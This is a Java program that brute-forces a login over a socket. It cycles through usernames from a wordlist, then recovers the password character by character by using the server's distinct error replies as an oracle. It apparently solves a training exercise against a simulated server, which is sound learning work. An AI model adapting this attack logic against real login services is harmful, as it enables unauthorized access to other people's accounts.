package hacker;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

import static hacker.JSON.convertFromJSON;
import static hacker.JSON.convertToJSON;

public class Main {

    public static String[] readFileAsLines(String filename) throws IOException {
        String data = new String(Files.readAllBytes(Paths.get(filename)));
        if (!data.isEmpty()) {
            return data.split("\n");
        } else {
            return null;
        }
    }



    public static void main(String[] args) throws IOException {

        if (args.length < 2) System.out.println("Usage: java hacker.Main IP_address port");
        else {
            String ip = args[0];
            int port = Integer.parseInt(args[1]);
            Guesser guesser = new Guesser(readFileAsLines("logins.txt"));
            try (
                    Socket socket = new Socket(ip, port);
                    DataInputStream input = new DataInputStream(socket.getInputStream());
                    DataOutputStream output  = new DataOutputStream(socket.getOutputStream())
            ) {
                Map<String,String> sent = new HashMap<>();
                sent.put("password", "");
                boolean loginFound = false;
                while (!loginFound) {
                    String login = guesser.getNextLogin();
                    if ("".equals(login)) break;
                    sent.put("login", login);
                    String JSON = convertToJSON(sent);
                    output.writeUTF(JSON);
                    String received = input.readUTF(); // read the reply from the server
                    String result = convertFromJSON(received).get("result");
                    loginFound = "Wrong password!".equals(result);
                }
                if (!loginFound) System.out.println("Could not find login");
                boolean passFound = false;
                while (!passFound && loginFound) {
                    String pass = guesser.getPassword();
                    sent.put("password", pass);
                    String JSON = convertToJSON(sent);
                    output.writeUTF(JSON);
                    String received = input.readUTF();
                    String result = convertFromJSON(received).get("result");
                    passFound = "Connection success!".equals(result);
                    if ("Exception happened during login".equals(result)) {
                        guesser.addNewLetter(); // right letter - start on next
                    } else if (!passFound) {
                        guesser.incrementCurrentLetter(); // wrong letter
                    }
                }
                if (passFound) {
                    System.out.println(convertToJSON(sent));
                } else System.out.println("Could not find password");

            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
